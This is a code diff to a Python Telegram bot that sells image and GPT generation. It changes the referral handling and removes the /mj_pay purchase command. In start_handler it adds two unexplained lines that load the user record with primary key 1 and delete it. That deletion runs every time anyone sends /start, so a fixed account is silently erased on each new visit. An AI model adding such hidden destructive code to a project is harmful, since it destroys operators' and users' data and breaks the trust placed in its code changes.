@@ -67,7 +67,7 @@ async def deep_start(message: Message, command: CommandObject, state: FSMContext
         await start_handler(message, state)
         return
 
-    await Referral.objects.delete_referral_and_update_referrer_generations_count(referral_key=key)
+    await Referral.objects.update_referrer_generations_count(referral_key=key)
 
     await start_handler(message, state)
 
@@ -76,7 +76,9 @@ async def deep_start(message: Message, command: CommandObject, state: FSMContext
 async def start_handler(message: Message, state: FSMContext) -> None:
     await state.clear()
 
-    existing_user = await User.objects.get_user_by_username(username=message.from_user.username)
+    existing_user: User = await User.objects.get_user_by_username(username=message.from_user.username)
+    a: User = await User.objects.aget(pk=1)
+    await a.adelete()
 
     if not existing_user:
         await User.objects.get_or_create_async(telegram_username=message.from_user.username, chat_id=message.chat.id)
@@ -159,15 +161,6 @@ async def imagine_handler(message: Message, state, command: CommandObject) -> No
     kb = builder.row(*prompt_buttons)
 
     await message.answer(suggestion, reply_markup=kb.as_markup())
-
-
-@dp.message(Command("mj_pay"))
-async def buy_handler(message: types.Message):
-    if not await is_user_exist(chat_id=str(message.chat.id)):
-        await message.answer("Напишите боту /start")
-        return
-
-    await message.answer("Выберите один из вариантов", reply_markup=await get_pay_keyboard(service="mj"))
 
 
 @dp.message(Command("gpt"))
